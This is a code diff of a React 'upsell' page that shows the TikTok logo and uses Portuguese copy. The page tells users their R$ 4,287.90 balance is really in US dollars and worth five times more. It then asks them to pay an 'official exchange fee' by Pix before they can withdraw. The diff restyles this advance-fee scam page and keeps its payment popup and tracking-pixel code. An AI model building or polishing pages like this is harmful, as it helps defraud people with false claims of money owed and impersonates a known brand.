@@ -1,7 +1,8 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import PixPaymentPopup from '@/components/PixPaymentPopup';
-import { trackViewContent, trackClickButton } from '@/lib/tiktokPixel';
+import PageTransition from '@/components/PageTransition';
+import { trackViewContent } from '@/lib/tiktokPixel';
 import '../styles/app.css';
 
 const SALDO_ATUAL = 4287.90;
@@ -30,225 +31,101 @@ const Up5 = () => {
   };
 
   return (
-    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '40px' }}>
-      {/* Header */}
-      <div style={{
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        padding: '16px',
-        gap: '6px',
-      }}>
-        <img src="/images/tiktok-logo.png" alt="TikTok" style={{ height: '28px' }} />
-      </div>
+    <PageTransition>
+      <main className="upsell-page">
+        {/* Header */}
+        <div className="upsell-header">
+          <img src="/images/tiktok-logo.png" alt="TikTok" className="upsell-logo" />
+        </div>
 
-      {/* Alert Card */}
-      <div style={{
-        backgroundColor: '#fff',
-        borderRadius: '12px',
-        margin: '0 12px 12px',
-        padding: '32px 20px',
-        fontFamily: 'Inter, system-ui, sans-serif',
-        textAlign: 'center',
-      }}>
-        <div style={{ fontSize: '48px', marginBottom: '20px' }}>🇺🇸</div>
+        {/* Alert Card */}
+        <div className="upsell-card upsell-card-center">
+          <div className="flag-emoji">🇺🇸</div>
 
-        <h1 style={{
-          fontSize: '20px',
-          fontWeight: 700,
-          color: '#000',
-          margin: '0 0 16px',
-          lineHeight: 1.4,
-          textTransform: 'uppercase',
-        }}>
-          PARE! SEU SALDO NÃO É DE R$ {formatBR(SALDO_ATUAL)}. O SISTEMA IDENTIFICOU QUE O VALOR ORIGINAL ESTÁ EM DÓLARES!
-        </h1>
+          <h1 className="alert-heading">
+            PARE! SEU SALDO NÃO É DE R$ {formatBR(SALDO_ATUAL)}. O SISTEMA IDENTIFICOU QUE O VALOR ORIGINAL ESTÁ EM DÓLARES!
+          </h1>
 
-        <p style={{
-          fontSize: '14px',
-          color: '#666',
-          margin: 0,
-          lineHeight: 1.6,
-        }}>
-          Acabamos de receber um alerta do servidor internacional. As tarefas foram patrocinadas por empresas americanas e seu saldo foi mostrado na moeda errada.
-        </p>
-      </div>
+          <p className="upsell-text-muted">
+            Acabamos de receber um alerta do servidor internacional. As tarefas foram patrocinadas por empresas americanas e seu saldo foi mostrado na moeda errada.
+          </p>
+        </div>
 
-      {/* What it means Card */}
-      <div style={{
-        backgroundColor: '#fff',
-        borderRadius: '12px',
-        margin: '0 12px 12px',
-        padding: '24px 20px',
-        fontFamily: 'Inter, system-ui, sans-serif',
-      }}>
-        <h2 style={{
-          fontSize: '16px',
-          fontWeight: 600,
-          color: '#000',
-          margin: '0 0 16px',
-          textAlign: 'center',
-        }}>
-          O que isso significa?
-        </h2>
+        {/* What it means Card */}
+        <div className="upsell-card">
+          <h2 className="card-section-title">O que isso significa?</h2>
 
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-          {[
-            'Seu saldo real é 5 VEZES MAIOR que o mostrado.',
-            'O valor está travado em Dólares (USD).',
-            'Necessário realizar a conversão imediata para Sacar.',
-          ].map((item, idx) => (
-            <div key={idx} style={{
-              display: 'flex',
-              alignItems: 'flex-start',
-              gap: '12px',
-            }}>
-              <div style={{
-                width: '24px',
-                height: '24px',
-                borderRadius: '50%',
-                backgroundColor: '#22c55e',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                flexShrink: 0,
-              }}>
-                <span style={{ color: '#fff', fontSize: '14px' }}>✓</span>
+          <div className="check-list">
+            {[
+              'Seu saldo real é 5 VEZES MAIOR que o mostrado.',
+              'O valor está travado em Dólares (USD).',
+              'Necessário realizar a conversão imediata para Sacar.',
+            ].map((item, idx) => (
+              <div key={idx} className="check-item">
+                <div className="check-icon">✓</div>
+                <span>{item}</span>
               </div>
-              <span style={{ fontSize: '14px', color: '#000', lineHeight: 1.5 }}>{item}</span>
-            </div>
-          ))}
-        </div>
-      </div>
-
-      {/* Math Card */}
-      <div style={{
-        backgroundColor: '#fff',
-        borderRadius: '12px',
-        margin: '0 12px 12px',
-        padding: '24px 20px',
-        fontFamily: 'Inter, system-ui, sans-serif',
-      }}>
-        <h2 style={{
-          fontSize: '16px',
-          fontWeight: 600,
-          color: '#000',
-          margin: '0 0 20px',
-          textAlign: 'center',
-        }}>
-          A Matemática da Conversão:
-        </h2>
-
-        <div style={{
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-          paddingBottom: '14px',
-          borderBottom: '1px solid #f1f1f1',
-          marginBottom: '14px',
-        }}>
-          <span style={{ fontSize: '14px', color: '#444' }}>Saldo Atual Visualizado</span>
-          <span style={{ fontSize: '16px', fontWeight: 600, color: '#000' }}>R$ {formatBR(SALDO_ATUAL)}</span>
-        </div>
-
-        <div style={{
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-          backgroundColor: '#fffbeb',
-          padding: '14px',
-          borderRadius: '8px',
-          marginBottom: '14px',
-        }}>
-          <span style={{ fontSize: '14px', color: '#444' }}>Fator Multiplicador (USD)</span>
-          <span style={{ fontSize: '16px', fontWeight: 600, color: '#d97706' }}>5x (Cotação Atual)</span>
-        </div>
-
-        <div style={{
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-          paddingBottom: '20px',
-          borderBottom: '1px solid #f1f1f1',
-          marginBottom: '20px',
-        }}>
-          <span style={{ fontSize: '14px', color: '#444' }}>Status da Conversão</span>
-          <span style={{ fontSize: '16px', fontWeight: 600, color: '#ef4444' }}>Pendente</span>
-        </div>
-
-        <div style={{
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-        }}>
-          <span style={{ fontSize: '16px', fontWeight: 700, color: '#000' }}>NOVO SALDO<br />CONVERTIDO:</span>
-          <div style={{ textAlign: 'right' }}>
-            <span style={{ fontSize: '14px', color: '#000' }}>R$</span>
-            <span style={{ fontSize: '32px', fontWeight: 700, color: '#000', marginLeft: '4px' }}>
-              {formatBR(SALDO_CONVERTIDO).split(',')[0]},
-            </span>
-            <span style={{ fontSize: '20px', fontWeight: 700, color: '#000' }}>
-              {formatBR(SALDO_CONVERTIDO).split(',')[1]}
-            </span>
+            ))}
           </div>
         </div>
-      </div>
 
-      {/* CTA Card */}
-      <div style={{
-        backgroundColor: '#fff',
-        borderRadius: '12px',
-        margin: '0 12px',
-        padding: '24px 20px',
-        fontFamily: 'Inter, system-ui, sans-serif',
-        textAlign: 'center',
-      }}>
-        <p style={{
-          fontSize: '14px',
-          color: '#444',
-          margin: '0 0 20px',
-          lineHeight: 1.6,
-        }}>
-          Para corrigir isso e converter o valor total para sua conta bancária brasileira, precisamos pagar a Taxa de Câmbio Oficial.
-        </p>
+        {/* Math Card */}
+        <div className="upsell-card">
+          <h2 className="card-section-title">A Matemática da Conversão:</h2>
 
-        <button
-          onClick={() => setShowPixPopup(true)}
-          style={{
-            width: '100%',
-            padding: '16px',
-            backgroundColor: '#fe2b54',
-            color: '#fff',
-            border: 'none',
-            borderRadius: '12px',
-            fontSize: '14px',
-            fontWeight: 600,
-            cursor: 'pointer',
-            lineHeight: 1.4,
-          }}
-        >
-          PAGAR TAXA DE CÂMBIO E SACAR R$ {formatBR(SALDO_CONVERTIDO)}
-        </button>
+          <div className="math-row math-row-border">
+            <span>Saldo Atual Visualizado</span>
+            <span className="math-value">R$ {formatBR(SALDO_ATUAL)}</span>
+          </div>
 
-        <p style={{
-          fontSize: '13px',
-          color: '#666',
-          marginTop: '12px',
-          marginBottom: 0,
-        }}>
-          Valor da taxa de conversão: R$ {formatBR(TAXA_CAMBIO)}
-        </p>
-      </div>
+          <div className="math-row math-row-highlight">
+            <span>Fator Multiplicador (USD)</span>
+            <span className="math-value math-value-orange">5x (Cotação Atual)</span>
+          </div>
 
-      {showPixPopup && (
-        <PixPaymentPopup
-          amount={TAXA_CAMBIO_CENTAVOS}
-          description="Taxa de Câmbio Oficial"
-          onSuccess={handlePaymentSuccess}
-          onClose={() => setShowPixPopup(false)}
-        />
-      )}
-    </main>
+          <div className="math-row math-row-border">
+            <span>Status da Conversão</span>
+            <span className="math-value math-value-red">Pendente</span>
+          </div>
+
+          <div className="math-row math-row-total">
+            <span className="math-label-bold">NOVO SALDO<br />CONVERTIDO:</span>
+            <div className="saldo-converted">
+              <span className="currency-small">R$</span>
+              <span className="saldo-int">{formatBR(SALDO_CONVERTIDO).split(',')[0]},</span>
+              <span className="saldo-dec">{formatBR(SALDO_CONVERTIDO).split(',')[1]}</span>
+            </div>
+          </div>
+        </div>
+
+        {/* CTA Card */}
+        <div className="upsell-card upsell-card-center">
+          <p className="upsell-text">
+            Para corrigir isso e converter o valor total para sua conta bancária brasileira, precisamos pagar a Taxa de Câmbio Oficial.
+          </p>
+
+          <button
+            onClick={() => setShowPixPopup(true)}
+            className="cta-button cta-primary cta-rounded"
+          >
+            PAGAR TAXA DE CÂMBIO E SACAR R$ {formatBR(SALDO_CONVERTIDO)}
+          </button>
+
+          <p className="cta-footnote">
+            Valor da taxa de conversão: R$ {formatBR(TAXA_CAMBIO)}
+          </p>
+        </div>
+
+        {showPixPopup && (
+          <PixPaymentPopup
+            amount={TAXA_CAMBIO_CENTAVOS}
+            description="Taxa de Câmbio Oficial"
+            onSuccess={handlePaymentSuccess}
+            onClose={() => setShowPixPopup(false)}
+          />
+        )}
+      </main>
+    </PageTransition>
   );
 };
 
